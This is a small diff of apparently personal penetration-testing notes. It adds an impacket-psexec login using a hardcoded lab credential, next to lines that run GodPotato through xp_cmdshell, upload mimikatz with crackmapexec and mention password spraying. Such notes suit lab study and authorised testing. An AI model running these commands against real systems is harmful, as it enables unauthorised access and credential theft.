@@ -875,6 +875,9 @@ xp_cmdshell C:\Users\Public\Downloads\GodPotato-NET4.exe -cmd "cmd /c net Admini
 psexec.py Administrator@172.16.X.X # login psexec
 crackmapexec mssql 172.16.X.X -u USER -p PASS --put-file mimikatz.exe C:\\Users\\Public\\Downloads\\mimikatz.exe #put file mssql
 
+#login to SMB command line with active creds
+impacket-psexec medtech/joe:'Flowers1'@172.16.203.11
+
 
 #Inplace of username and password, we can include usernames.txt and passwords.txt for password-spraying or bruteforcing.
 
